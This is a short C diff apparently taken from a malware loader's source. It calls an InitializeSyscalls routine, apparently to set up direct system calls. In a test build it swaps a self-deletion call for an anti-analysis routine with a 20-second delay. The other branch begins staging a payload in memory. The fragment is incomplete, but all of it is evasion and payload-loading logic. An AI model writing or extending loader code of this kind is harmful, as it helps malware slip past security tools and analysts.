@@ -13,8 +13,9 @@ int main() {
 	// Init syscalls for use
 	InitializeSyscalls();
 #ifdef TEST
-	SelfDelete();
-
+	DWORD	seconds = 20;
+	DWORD	dwMilliseconds = seconds * 1000;
+	AntiAnalysis(dwMilliseconds);
 #else
 	PVOID pPayloadAddress = NULL;
 	SIZE_T sPayloadSize = 0;
